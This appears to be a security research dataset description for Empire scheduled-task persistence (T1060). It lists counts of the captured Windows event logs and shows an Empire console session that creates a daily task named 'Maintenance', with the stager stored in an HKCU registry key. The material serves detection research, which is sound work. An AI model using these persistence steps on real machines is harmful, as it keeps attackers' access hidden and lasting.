
# Empire Userland Schedule Tasks

An adversary can create a registry key and scheduled task to maintain persistence in the environment.

## Technique(s) ID

T1060

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_userland_schtasks.tar.gz](./empire_userland_schtasks.tar.gz)

## Network Environment

Shire

## Time Taken

2019-03-19024742

## About this file

| log_name                                 | source_name                         | task                                                   |   record_number |
|------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | PowerShell                          | Pipeline Execution Details                             |             139 |
| Security                                 | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             198 |
| Security                                 | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |              88 |
| Security                                 | Microsoft-Windows-Security-Auditing | Group Membership                                       |               7 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logoff                                                 |               7 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logon                                                  |               7 |
| Security                                 | Microsoft-Windows-Security-Auditing | Special Logon                                          |               6 |
| Security                                 | Microsoft-Windows-Security-Auditing | File Share                                             |               3 |
| Security                                 | Microsoft-Windows-Security-Auditing | Process Termination                                    |               3 |
| Security                                 | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |               1 |
| Security                                 | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               1 |
| Security                                 | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               1 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             161 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |              69 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              33 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |              24 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |              23 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |               8 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               1 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               1 |
| Microsoft-Windows-PowerShell/Operational | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             116 |
| Microsoft-Windows-DNS-Client/Operational | Microsoft-Windows-DNS-Client        | na                                                     |             192 |

## Empire Activity

```
usemodule persistence/userland/schtasks
```

```
(Empire: powershell/persistence/userland/schtasks) > set Listener https
(Empire: powershell/persistence/userland/schtasks) > set TaskName Maintenance
(Empire: powershell/persistence/userland/schtasks) > info   

              Name: Invoke-Schtasks
            Module: powershell/persistence/userland/schtasks
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) using schtasks. This has a
  moderate detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  DailyTime  False       09:00                     Daily time to trigger the script        
                                                   (HH:mm).                                
  ProxyCreds False       default                   Proxy credentials                       
                                                   ([domain\]username:password) to use for 
                                                   request (default, none, or other).      
  ExtFile    False                                 Use an external file for the payload    
                                                   instead of a stager.                    
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                   script from specified location.         
  TaskName   True        Maintenance               Name to use for the schtask.            
  IdleTime   False                                 User idle time (in minutes) to trigger  
                                                   script.                                 
  ADSPath    False                                 Alternate-data-stream location to store 
                                                   the script code.                        
  Agent      True        FD6A3MGY                  Agent to run module on.                 
  Listener   False       https                     Listener to use.                        
  RegPath    False       HKCU:\Software\Microsoft  Registry location to store the script   
                         \Windows\CurrentVersion\  code. Last element is the key name.     
                         debug                   
  Proxy      False       default                   Proxy to use for request (default, none,
                                                   or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                   request (default, none, or other).      

(Empire: powershell/persistence/userland/schtasks) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked FD6A3MGY to run TASK_CMD_WAIT
[*] Agent FD6A3MGY tasked with task ID 11
[*] Tasked agent FD6A3MGY to run module powershell/persistence/userland/schtasks
(Empire: powershell/persistence/userland/schtasks) > SUCCESS: The scheduled task "Maintenance" has successfully been created.
Schtasks persistence established using listener https stored in HKCU:\Software\Microsoft\Windows\CurrentVersion\debug with Maintenance daily trigger at 09:00.

(Empire: powershell/persistence/userland/schtasks) >
```